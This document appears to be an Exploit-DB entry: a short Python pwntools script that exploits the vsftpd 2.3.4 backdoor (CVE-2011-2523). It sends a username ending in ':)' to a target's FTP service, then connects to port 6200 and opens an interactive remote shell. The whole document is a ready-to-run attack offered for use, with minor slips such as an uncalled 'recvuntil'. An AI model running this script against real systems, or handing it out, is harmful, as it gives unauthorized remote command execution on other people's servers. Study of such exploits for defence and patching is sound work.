# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
# Source: https://www.exploit-db.com/exploits/49757
# CVE: CVE-2011-2523

#!/usr/bin/python3

import argparse
from pwn import *
from time import sleep

parser = argparse.ArgumentParser()
parser.add_argument("ip", help="input the ip of the host", type=str)
parser.add_argument(
    "-port", help="input the port for (vsftpd 2.3.4)", type=int, default=21)

args = parser.parse_args()
ip = args.ip
port = args.port

print(
    f"\n\tvsftpd 2.3.4 | Backdoor Command Execution\n\nLogin: {ip}:{port}")
try:
    ftp = remote(ip, port, timeout=3)
except PwnlibException:
    exit()
ftp.recvuntil
print("\tBanner:", ftp.recv(1024).decode().strip())
ftp.sendline(r'USER nergal:)\n'.encode())
ftp.sendline(r'PASS pass\n'.encode())
print("\tExploit Sent :)")
sleep(2)
ftp.close()

try:
    rce = remote(ip, 6200, timeout=3)
except PwnlibException:
    exit()
print(f"\tBackdoor Connected: {ip}:6200")
rce.interactive()
rce.close()
